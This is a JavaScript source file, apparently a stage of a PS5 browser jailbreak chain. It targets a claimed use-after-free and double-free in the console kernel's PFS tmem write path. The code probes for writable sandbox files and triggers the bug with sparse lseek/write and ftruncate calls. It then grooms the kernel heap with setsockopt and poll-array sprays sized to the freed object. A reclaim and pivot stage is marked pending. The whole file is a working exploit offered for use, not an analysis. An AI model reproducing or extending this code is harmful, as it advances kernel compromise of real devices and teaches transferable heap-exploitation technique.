import { int64 } from "./utils/int64.js";
import {
  SYS_OPEN, SYS_CLOSE, SYS_LSEEK, SYS_WRITE, SYS_SETSOCKOPT,
  SYS_SOCKET, SYS_PIPE2, SYS_POLL, SYS_FSTAT, SYS_FTRUNCATE,
} from "./utils/syscalls.js";

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ===========================================================================
// PS5 retail lane — tmem UAF / double-free (FUN_ffffffff80b5b350, PS5_1400.elf)
//
// Confirmed against PS5_1400 (devkit kernel image, same ELF family as retail):
//
//   pfs_write_tmem flow  ->  FUN_ffffffff80c335c0  ->  FUN_ffffffff80b5b350
//     malloc(0x148, &DAT_ffffffff81d19180, M_WAITOK|M_ZERO(0x102))
//     ... get_idblk_offset (FUN_ffffffff80b47e90) returns 0xfffffffe
//         when the indirect level exceeds cap 0xc ("array size=.. less than
//         idb_level", line 0x22ce) ...
//   error branch "get_blkno_icv_same_region" err 0x50c3:
//     - walks 0x148 entries (stride 0x10), conditionally free()s stale
//       entry pointers, zero-writes each entry (uaf write, pre-free)
//     - free(local_d0)                                    [FREE #1]
//     - immediately re-walks the FREED block using the count field
//       re-read from the freed memory                     [UAF window]
//     - zero-writes entries again (uaf write) and conditionally
//       free()s stale pointers read out of the freed block
//     - goto LAB_ffffffff80b5ce42 -> free(local_d0)       [FREE #2]
//
// 
//
// 
//
// 
// ===========================================================================

const O_RDWR = 0x2;
const SEEK_SET = 0;

// Poll array kernel alloc: sys_poll mallocs nfds * sizeof(struct pollfd)
// (8 bytes on amd64) into M_TEMP. 41 fds -> 0x148 == the vulnerable size.
const POLLFD_SIZE = 8;
const POLL_NFDS = 0x148 / POLLFD_SIZE;   // 41

// setsockopt soopt copyin allocates malloc(len, M_SOOPT) — exact size,
// content-controlled. Transient, but useful to fill the dup slot the moment
// it is double-enqueued (and to generate allocator churn).
const SOOPT_LEN = 0x148;
const SOL_SOCKET = 0xffff;
const SO_SNDTIMEO = 0x1005;

// ---------------------------------------------------------------------------
// [TEST-REVEAL] Candidate PFS-backed, browser-writable file paths.
// The retail webkit sandbox decides which of these actually opens O_RDWR.
// Each attempt is logged with its errno so the live session identifies the
// correct writable path fast. Replace/extend from observed results.
// ---------------------------------------------------------------------------
const CANDIDATE_PATHS = [
  "/data/browser0/cache.dat",
  "/data/browser0/cookies.dat",
  "/data/browser0/sitedata.dat",
  "/user/data/browser0/cache.dat",
  "/mnt/sandbox/pfs_browser_cache/cache.dat",
];

// ---------------------------------------------------------------------------
// [TEST-REVEAL] Trigger geometry. Defaults = report's typical config.
// Override via window.TMEM_CFG from offsets or site config if the live
// volume's capacity table differs.
// ---------------------------------------------------------------------------
function defaultGeometry() {
  const cfg = window.TMEM_CFG || {};
  return {
    blockSize: cfg.blockSize ?? 0x10000,     // 64 KiB typical PFS block
    levelCap: cfg.levelCap ?? 0xc,           // hardcoded 0xc in 80b5b350
    perLevelCap: cfg.perLevelCap ?? 8192,    // report's typical capacity table
    sweepExtra: cfg.sweepExtra ?? 4,         // attempts at threshold+n blocks
  };
}

function thresholdBlockCount(geo) {
  // threshold_blocks = levelCap + sum(cap[0..levelCap-1])
  let sum = 0;
  for (let i = 0; i < geo.levelCap; i++) sum += geo.perLevelCap;
  return geo.levelCap + sum;
}

function u64ToHiLo(value) {
  // JS-safe 64-bit split for offsets under 2^53 (6.4 GB is far below that)
  const lo = value >>> 0;
  const hi = Math.floor(value / 0x100000000) >>> 0;
  return new int64(lo, hi);
}

export async function runKernelExploit(p, chain, log) {
  return new TmemKernelExploit(p, chain, log).run();
}

class TmemKernelExploit {
  constructor(p, chain, log) {
    this.p = p;
    this.chain = chain;
    this.log = typeof log === "function" ? log : () => {};
    this.geo = defaultGeometry();

    this.fd = null;
    this.sprayFds = [];
    this.triggered = false;
  }

  report(tag, detail, type) {
    this.log(detail ? tag + ": " + detail : tag, type);
  }

  async sysInt(nr, ...args) {
    return (await this.chain.syscall(nr, ...args)).low | 0;
  }

  async sysRaw(nr, ...args) {
    return await this.chain.syscall(nr, ...args);
  }

  alloc(size) {
    const buf = this.p.malloc(size, 1);
    for (let i = 0; i < size; i += 4) this.p.write4(buf.add32(i), 0);
    return buf;
  }

  // -------------------------------------------------------------------------
  // Stage 0 [TEST-REVEAL] — find a writable PFS-backed file.
  // -------------------------------------------------------------------------
  async stage0_findWritable() {
    const paths = (window.TMEM_CFG && window.TMEM_CFG.paths) || CANDIDATE_PATHS;
    for (const path of paths) {
      const pathBuf = this.alloc(0x100);
      for (let i = 0; i < path.length; i++)
        this.p.write1(pathBuf.add32(i), path.charCodeAt(i));
      this.p.write1(pathBuf.add32(path.length), 0);

      const fd = await this.sysInt(SYS_OPEN, pathBuf, O_RDWR, 0);
      if (fd >= 0) {
        this.report("stage0", `writable PFS candidate: ${path} (fd ${fd})`, "success");
        this.fd = fd;
        this.path = path;
        return;
      }
      this.report("stage0", `open ${path} -> errno ${-fd}`);
    }
    throw new Error(
      "no writable PFS-backed candidate opened — extend CANDIDATE_PATHS " +
      "from the logged errnos (sandbox policy decides; this is the [TEST-REVEAL] knob)"
    );
  }

  // -------------------------------------------------------------------------
  // Stage 1 [VERIFIED path] — sparse write at the indirect-level threshold.
  //
  //   lseek(fd, threshold_offset, SEEK_SET); write(fd, buf, 1)
  //
  // A 1-byte sparse write allocates the indirect metadata up to that block
  // index; when get_idblk_offset sees level > 0xc it returns 0xfffffffe and
  // the 0x50c3 error branch runs: FREE -> UAF window -> FREE (double).
  // -------------------------------------------------------------------------
  async stage1_trigger() {
    const geo = this.geo;
    const baseBlocks = thresholdBlockCount(geo);
    const buf = this.alloc(1);
    this.p.write1(buf, 0x41);

    this.report(
      "stage1",
      `threshold = ${baseBlocks} blocks * 0x${geo.blockSize.toString(16)} = ` +
      `${(baseBlocks * geo.blockSize / (1024 * 1024 * 1024)).toFixed(2)} GB`
    );

    let attempts = 0;
    for (let extra = 0; extra <= geo.sweepExtra; extra++) {
      const blocks = baseBlocks + extra;
      const offset = blocks * geo.blockSize;
      const off64 = u64ToHiLo(offset);

      const lrv = await this.sysInt(SYS_LSEEK, this.fd, off64, SEEK_SET);
      if (lrv < 0) {
        this.report("stage1", `lseek(+${extra}) -> errno ${-lrv}`);
        continue;
      }

      const wrv = await this.sysInt(SYS_WRITE, this.fd, buf, 1);
      attempts++;
      this.report("stage1", `write @ blocks ${blocks} -> rv ${wrv}`);

      if (wrv < 0) {
        // EIO/EINVAL-family failures from the tmem path are the interesting
        // ones — that is where the 0x50c3 branch lives.
        this.report("stage1", `write failed errno ${-wrv} at +${extra} — likely 0x50c3 branch`, "info");
        this.triggered = true;
        break;
      }
      if (wrv === 1) {
        // Clean write: level cap not exceeded on this volume config; sweep up.
        continue;
      }
      await sleep(10);
    }

    // Second pass [STATIC-INSURANCE]: blkcnt at the 0x50c3 call site comes from
    // the idblk chain walk (FUN_ffffffff80b47e90 param_1 provenance), so a
    // fresh sparse write may not extend the chain on attempt one. If the
    // sweep wrote cleanly, pre-extend the chain with ftruncate to the
    // threshold, then retry the 1-byte write — the deep chain is what the
    // level>0xc check consumes.
    if (!this.triggered) {
      const threshold = thresholdBlockCount(this.geo) * this.geo.blockSize;
      const off64 = u64ToHiLo(threshold);
      const trv = await this.sysInt(SYS_FTRUNCATE, this.fd, off64);
      this.report("stage1", `ftruncate(threshold) -> rv ${trv}`);
      if (trv >= 0) {
        const buf2 = this.alloc(1);
        this.p.write1(buf2, 0x41);
        for (let extra = 0; extra <= this.geo.sweepExtra && !this.triggered; extra++) {
          const blocks = thresholdBlockCount(this.geo) + extra;
          const o64 = u64ToHiLo(blocks * this.geo.blockSize);
          await this.sysInt(SYS_LSEEK, this.fd, o64, SEEK_SET);
          const wrv2 = await this.sysInt(SYS_WRITE, this.fd, buf2, 1);
          this.report("stage1", `[pass2] write @ blocks ${blocks} -> rv ${wrv2}`);
          if (wrv2 < 0) {
            this.report("stage1", `[pass2] write failed errno ${-wrv2} — 0x50c3 branch on deep chain`, "info");
            this.triggered = true;
          }
        }
      }
    }

    if (!this.triggered) {
      this.report(
        "stage1",
        "no error-path write in sweep — either geometry mismatch or the " +
        "volume tolerates the depth (check perLevelCap/blockSize via window.TMEM_CFG)",
        "error"
      );
      throw new Error("stage1: trigger not confirmed");
    }
  }

  // -------------------------------------------------------------------------
  // Stage 2 [PENDING] — reclaim the double-freed 0x148 slot.
  //
  // The dup-free is unconditional once stage1 hits the 0x50c3 branch; no race
  // is needed for the double-enqueue itself. Reclaim candidates, both exact
  // 0x148-class:
  //   a) setsockopt(M_SOOPT) — content-controlled, transient
  //   b) sys_poll M_TEMP pollfd arrays — content-controlled (fd numbers),
  //      persists while poll parks
  // Win condition for the [PENDING] pivot: one dup slot must be reclaimed by
  // an object with kernel pointers; the other ref then gives read/write into
  // it. Victim class selection is the first live-test decision.
  // -------------------------------------------------------------------------
  async stage2_reclaim() {
    // Allocator churn: ensure the dup slot is off the LIFO cache head by the
    // time we reclaim, using SOOPT spray volume.
    const sprayBuf = this.alloc(SOOPT_LEN);
    for (let i = 0; i < SOOPT_LEN; i += 4)
      this.p.write4(sprayBuf.add32(i), 0x41424344 + i);

    const sock = await this.sysInt(SYS_SOCKET, 2 /*AF_INET*/, 2 /*SOCK_DGRAM*/, 0);
    if (sock >= 0) {
      for (let i = 0; i < 64; i++)
        await this.sysInt(SYS_SETSOCKOPT, sock, SOL_SOCKET, SO_SNDTIMEO, sprayBuf, SOOPT_LEN);
      await this.sysInt(SYS_CLOSE, sock);
    }
    this.report("stage2", "SOOPT churn done (64x0x148)");

    // Pipe-backed poll arrays: 41 fds = 0x148 exactly, parked in poll().
    const fds = this.alloc(8);
    const rv = await this.sysInt(SYS_PIPE2, fds, 0x4 /*O_NONBLOCK*/);
    if (rv >= 0) {
      const rfd = this.p.read4(fds) >>> 0;
      const wfd = this.p.read4(fds.add32(4)) >>> 0;
      for (let i = 0; i < 16; i++) {
        const pollbuf = this.alloc(0x148);
        for (let n = 0; n < POLL_NFDS; n++) {
          this.p.write4(pollbuf.add32(n * POLLFD_SIZE), rfd);
          this.p.write2(pollbuf.add32(n * POLLFD_SIZE + 4), 0x1 /*POLLIN*/);
        }
        // non-blocking poll (timeout 0) — parks nothing, but the M_TEMP
        // array is allocated with our content at the exact size class.
        await this.sysInt(SYS_POLL, pollbuf, POLL_NFDS, 0);
      }
    }
    this.report("stage2", "poll-array reclaim spray done (16x41 fds)");

    // [PENDING] overlap verification + victim co-placement is the next step
    // and needs the live session's timing data.
    this.report("stage2", "[PENDING] overlap verification not wired yet", "info");
    return { done: false };
  }

  async rescue() {
    if (this.fd !== null) {
      try { await this.sysInt(SYS_CLOSE, this.fd); } catch {}
      this.fd = null;
    }
    for (const fd of this.sprayFds) {
      try { await this.sysInt(SYS_CLOSE, fd); } catch {}
    }
    this.sprayFds = [];
  }

  async run() {
    this.report("start", "kernel stage: tmem UAF/double-free (retail lane)");
    try {
      await this.stage0_findWritable();
      await this.stage1_trigger();
      const r2 = await this.stage2_reclaim();
      return {
        done: true,
        triggered: this.triggered,
        overlap: false,
        pivot: r2.done,
        path: this.path,
      };
    } catch (e) {
      this.report("fatal", String(e?.message ?? e));
      throw e;
    } finally {
      await this.rescue();
    }
  }
}
